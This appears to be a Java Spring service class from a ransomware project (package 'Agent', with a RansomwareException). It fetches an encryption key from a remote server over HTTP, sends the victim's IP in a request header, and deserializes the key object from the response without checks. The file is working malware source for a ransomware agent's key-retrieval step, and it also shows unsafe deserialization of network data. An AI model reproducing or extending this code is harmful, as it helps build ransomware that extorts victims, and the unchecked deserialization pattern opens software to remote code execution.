package Agent.services;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import javax.servlet.http.HttpServletRequest;

import org.springframework.stereotype.Service;

import Agent.entites.CryptoKey;
import Agent.exceptions.CryptoException;
import Agent.exceptions.RansomwareException;

@Service
public class KeyService {

	private HttpServletRequest request;

	private String getClientIp() {
	
		String remoteAddr = "";

		if (request != null) {
			remoteAddr = request.getHeader("X-FORWARDED-FOR");
			if (remoteAddr == null || "".equals(remoteAddr)) {
				remoteAddr = request.getRemoteAddr();
			}
		}

		return remoteAddr;
	}

	public CryptoKey getKey(String url) throws RansomwareException, IOException, ClassNotFoundException {

		URL urlForGetRequest;
		int responseCode = 0;
		HttpURLConnection con;
		try {
			urlForGetRequest = new URL(url);
			con = (HttpURLConnection) urlForGetRequest.openConnection();
			con.setRequestProperty("ip", getClientIp());
			responseCode = con.getResponseCode();

		} catch (MalformedURLException e2) {
			throw new MalformedURLException("malformed URL has occurred. Either nolegal protocol could be found in a specification string or thestring could not be parsed.");
		} catch (IOException e) {
			
			throw new IOException(e.getCause());
		}
		if (responseCode == HttpURLConnection.HTTP_OK) {
			try (ObjectInputStream is = new ObjectInputStream(con.getInputStream());) {
				CryptoKey key = (CryptoKey) is.readObject();
				return key;
			} catch (ClassNotFoundException e) {
				throw new ClassNotFoundException(" object stream class not found", e.getCause());
			} catch (IOException e1) {
				throw new IOException("key object from the input stream is not found",e1.getCause());
			}
		}
		throw new RansomwareException(" key get request failed");

	}
}
